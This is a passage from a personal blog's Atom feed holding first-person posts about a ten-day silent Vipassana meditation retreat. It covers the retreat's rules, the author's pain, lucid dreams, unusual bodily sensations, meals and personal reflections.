&lt;p&gt;Discontinuing other forms of rituals (religious objects, rosaries, crystals, talismans, etc), deity worship, and meditation techniques.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;No physical contact is allowed.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Wear plain and loose clothing. Less distraction for students.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;No physical exercise or yoga. Basic stretching is permitted.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;No writing, reading, or listening to music.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;No technological devices. Simple watches or clocks are permitted. Any devices that can contact with the outside world is not permitted.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;You must adhere with the daily meditation timetable.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Reading the code of conduct felt like I was opting into becoming a inmate of solidarity confinement. Papers has been signed and now I have to surrender my belongings like keys, wallet, and the ultimate sceptre of knowledge, my smart phone. I checked my emails one last time and my OCD habit of emptying junk mail when it purges automatically every week. I kissed it good bye and it was gone out of my hands. Feeling naked and couple of IQ points dumber, I had to walk off the separation anxiety. Staring at my left jean pocket with a permanent rectangular faded shape reminded me of my phone. It’s like I’m going through a bad break up or something. The smart phone was an extension of my nervous system, I felt phantom vibrations tingling like a missing limb. I admit it, I’m a technology-addled person who needs help.&lt;&#x2F;p&gt;
&lt;p&gt;During the orientation, the course manager proceeds with explaining the code of honour, course boundaries, and daily announcements. By the end of the orientation, she tells us:&lt;&#x2F;p&gt;
&lt;p&gt;&amp;quot;Work diligently, work ardently, work intelligently, work patiently and persistently, and you are bound to be successful, bound to be successful.&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;I heard this same sentence throughout the 10 days repeatedly. It was part of Buddhism mantra. At first, I didn’t take that statement seriously but I soon realized this retreat was no walk in the park.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Ten Days of Silence - Part 2</title>
        <published>2013-07-26T00:00:00+00:00</published>
        <updated>2013-07-26T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/personal-10dayspt2/" type="text/html"/>
        <id>https://johntuyen.com/posts/personal-10dayspt2/</id>
        
        <content type="html">&lt;p&gt;Getting up at 4:00AM to get ready for 4:30AM group meditation hall was a personal struggle. I was still half asleep and didn’t get much rest because I was sleeping on a gimpy bed. It literally sags into a U-shape once laid on top of it for 3 minutes. I wasn’t too happy about this because if I don’t get proper rest, I’m going to be cranky. But I didn’t let myself think of it that way. Instead, I thought of it as a motivator to get out of bed, force myself to get up and walk outside of chilling 2 degree celsius weather. If I stayed in my room to meditate alone, I know I’ll be snuggling back into my warm bed sheets within the next couple of minutes.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-commitment&quot;&gt;The Commitment&lt;&#x2F;h3&gt;
&lt;p&gt;My experience in the meditation hall for the first few days were really boring and frustrating. All we had to do is observe our respiration through our nose. Is the air coming from both nostrils or one sided? Is the air hot or cold? For the next 3 days, that is all we did and this is where anguish begins.&lt;&#x2F;p&gt;
&lt;p&gt;I started to unveil all sorts of habitual things I didn’t know about myself that could be harmful or pleasant. Even though this task of observing respiration should be simple to follow, I noticed my mind will lose focus every 2–4 minutes and starts to wander off to LaLa land. Throughout my adulthood, I’ve been told to have ADHD but honestly I never believed it’s a disorder but really part of my personality. I’ve taken the MBTI test (it has flaws) a month ago and figured out I’m a ENFP which some characteristics correspond to ADHD-like behaviour.&lt;&#x2F;p&gt;
&lt;p&gt;Noticing how terrible my mind has been conditioned, I motivated myself to do better. When I say motivated, I mean fully committed to the act of changing your life for the better. Not some cheap ego boosting trick. If I don’t get motivated and just do things half ass, the experience will be half ass as well. This is not why I’m here at the retreat. I wasn’t here to commit 10 gruelling days of my life to sit around twiddling my thumbs. I was seeking to solve why I’m here in this world for. Finding my flow.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;lessons-about-pain&quot;&gt;Lessons about pain&lt;&#x2F;h3&gt;
&lt;p&gt;For the entire 10-days, I was suffering the longest excruciating back pain that I’ve ever experienced. Regardless how painful it was, I persisted through the pain by focusing on my respiration. For some uncanny reason, the more I focus on the respiration, the less pain I would feel but only slightly. I wasn’t sure if my brain pain responses were playing tricks or was I really learning the technique correctly. But finding out this trick, I realized pain can be objectified as something physical that is not being attached to something mental.&lt;&#x2F;p&gt;
&lt;p&gt;During the first 3 days of practice, I would secretly peek and observe others in the room and see if they were in pain of some form because I sure hell was. I thought I seen a good portion of students were relax and calm. At the end of the noble silence, I eagerly asked everyone if they experienced immense pain. All of the first timers and some of the old students said hell freaking yes. My room mate with numerous spiritual journey experiences said it was one of the most painful spiritual journey he’s ever encountered although the end result was on par with Ayahuasca experience in Peru. Maybe I don’t have to go to the depths of the Amazon jungle after all.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;did-i-swallow-the-red-pill&quot;&gt;Did I swallow the red pill?&lt;&#x2F;h3&gt;
&lt;p&gt;Being mentally and physically taxed every night, I had very strange lucid dreams for 3 days straight. During the 2nd night, I dreamt that I was on a pirate ship with Johnny Depp in a red brownish colour clay form. All of a sudden he disintegrated in front of me and a giant octopus arm came up from the side of the ship and grabbed my leg. I freaked out and quickly swung my left leg in a sweeping motion that smacked against the wall beside me. A loud bang was made and I heard the guys next door shuffling in their bed, I think I woke them up. I was perplexed on what the heck happened and embarrassed at the same time. It was 2:30AM and I have less than 2 hours of sleep before waking up for another mind bending day.&lt;&#x2F;p&gt;
&lt;p&gt;It wasn’t the only lucid dream I had during my stay, I had other dreams that were just as vivid. In this other dream, I spoke out loud while I was sleeping. I think I said something along the lines of “Shut the fuck up dumb ass!” to a bank robber in my dream. My room mate chuckled at what happened and once again I was embarrassed. I wanted to apologize for disturbing his sleep but we couldn’t communicate during noble silence!&lt;&#x2F;p&gt;
&lt;p&gt;I was a bit concerned with the dreams I was experiencing so I sought after speaking with the assistant teacher. The assistant teacher said it’s normal to experience lucid dreaming. He said “ignore what you dreamt and know that it’s not real. I am going through the phase of shedding saṅkhāra in my unconscious mind”. Saṅkhāra is a unit of misery in your mind that creates volitional conditions which make up your subconscious habits. By shedding saṅkhāra, you’re liberating yourself from cravings and aversions. For you science folks, I don’t know if this is true or not so I’ll let you decide for yourself. The lucid dreams did eventually tone down and more or less stopped by day 5.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;mada-mada-dane&quot;&gt;Mada Mada Dane&lt;&#x2F;h3&gt;
&lt;p&gt;There were couple of times when I wanted to quit like on day 4. What held me together were quotes and insights from S.N. Goenka’s discourse videos played every evening. “Don’t react, just observe.” This quote really helped me throughout the daily practices. Understanding your sensations before reacting to any situation. If you react to every type of situation, you’re teaching the subconscious to react with sensations of cravings, aversion, and disillusions. You must discipline your mind from these 3 types of reactions by first controlling your sensations. This is when I first learned the meaning of equanimity. An equanimous person does not get subdued by failure or becomes too happy when succeeding. Those two characteristics was the opposite of how I was living my day-to-day life. I wanted balance and this was what I was looking for.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;strangeness-happened&quot;&gt;Strangeness Happened&lt;&#x2F;h3&gt;
&lt;p&gt;On day 4 and onward, we were beginning to learn how to feel sensations on each part of the body. Starting from top of the head and down to your toes. Inch by inch, we focus on feeling the sensations. This was way harder than focusing on your nose area. There were many blank spots such as back of my neck which I didn’t feel anything besides pain. Pain is a sensation but I did not classify as such until S.N. Goenka mentioned it during the discourse videos. The reason why I didn’t classify pain as a sensation is because I was expecting blissful sensations like everyone would expect. Instead my entire body was filled with pain. If I wanted pain, I wouldn’t have come to this retreat, I had pain in my life already.&lt;&#x2F;p&gt;
&lt;p&gt;I continued on sitting through the 2 hour session and it seemed like forever but something strange happened. About 1.5 hours into sitting, I felt a tingling vibration in my chest area. It felt like if every cell was vibrating at a high frequency. I sat there as still as I could and observe what this phenomenon was happening with my body or mind has manifested.&lt;&#x2F;p&gt;
&lt;p&gt;One of the things I definitely felt was my back became pain free. I started to erect my body more upright and felt lighter physically and mentally. I was profusely sweating around my upper body area but didn’t feel cold instead I was feeling warmer. This sensation felt good, I mean like really good. I knew I shouldn’t be craving for this pleasurable sensation for a long period of time so I had to break my meditative state. I looked around and no one was in the hall, everyone left except for me. I didn’t exactly know what happened to me but I felt like I was mentally rebooted. My mind feels lighter and clearer ever than before. At that moment, I broke down and cried to myself because I knew I found something I was seeking for the longest time. Breaking the shackles that plagued my mental well being.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;triggering-the-strangeness&quot;&gt;Triggering the Strangeness&lt;&#x2F;h3&gt;
&lt;p&gt;Near the end of every session, S.N Goenka Hindu chants are played through the speakers. You can hear people in the room breathe a sigh of relief as it’s an indication of 10–15 minutes left before meditation session end. This was only the beginning of the journey for myself. If you want to relate on what I was feeling — have you ever listened to your favourite song and had goose bumps? Well, this tingling vibration is something like that but not quite. The tingling vibration is amplified by the chants and the vibrating sensation spreads itself around my body. I’ve had this phenomenon happened consecutively on day 5, 6, and 7. I can only summon this sensation during the morning hours between 6:00AM — 6:30AM.&lt;&#x2F;p&gt;
&lt;p&gt;My teacher was a bit surprised when I told him about this sensation because I’m a new student. He said not to crave for these pleasurable sensations. “To achieve true enlightenment, you must not crave for enlightenment. True enlightenment is free from craving.” I don’t know if I really did experience enlightenment but my body felt lighter and my pain subsided to non-existent level.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;thin-privileges&quot;&gt;Thin Privileges&lt;&#x2F;h3&gt;
&lt;p&gt;After going through trial and tribulations, I finally settled into a daily systematic routine — more or less by day 5. For days when I felt mentally and physically beat up, I always looked forward to vegetarian meals, especially breakfast. Oatmeal with cinnamon dates, yogurt, raisins, sunflower seeds, and a splash of almond milk. One slice of toast with ghee and strawberry jam. I still remember there was one day I felt very mentally exhausted and we had jap jae (Korean glass noodles) for lunch, it gave me the emotional boost I needed to get by the rest of the day.&lt;&#x2F;p&gt;
&lt;p&gt;Every meal was surprisingly satisfying as there are many choices for you to mix and match. I’ve never been on a strict diet before because I don’t struggle with weight issues. I know, I’m lucky. But without much protein, I know I’ll be losing weight or muscle mass and fast, it’s just how my own body works. Before I went to the retreat, I was weighing in at 65 kg (143 lbs). By the end of the 10-day retreat, my weight dropped to 62 kg (137 lbs). Going through a strict dieting protocol was an insightful experience. Not only did I lose 3 kg (6 lbs), I felt my mental clarity was sharper and more alert but this causation could also be the result of intense meditation sessions as well.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;redefining-of-self&quot;&gt;Redefining of Self&lt;&#x2F;h3&gt;
&lt;p&gt;By the end of the course, I can happily say I can meditate for an hour or more with little agitation. I was proud that I completed the course and learned new coping tools to tame my monkey brain. I’m ready to take on the world again. I never would have thought these 10-days were the best 10-days of my life.&lt;&#x2F;p&gt;
&lt;p&gt;Majority of my 20s was focused on achieving something successful on societal standards so I was jumping from one idea to another. Craving for success so persistently to the point I felt like I lost like half a decade of my life mindlessly reacting and not living in or observing the present moment. Unfortunately, none of the grandiose ideas ever succeeded and all I got was misery and lost confidence on what I did best. Watching your peers climbing corporate careers made me think I should have done the same thing but I knew deep inside settling into a corporate career wasn’t the choice I’m willing to settle with. I don’t want to regret for the things I didn’t do, I’d rather regret for what I have done.&lt;&#x2F;p&gt;
&lt;p&gt;For a period of time, I was living in the state of dysphoria and anhedonia which eventually downward spiralled into a state of funk. It’s one of the scariest feeling one should face and only you can only figure it out. I don’t know if you will get the same results as I did but really you have nothing to lose for trying.&lt;&#x2F;p&gt;
</content>
        
    </entry>
</feed>
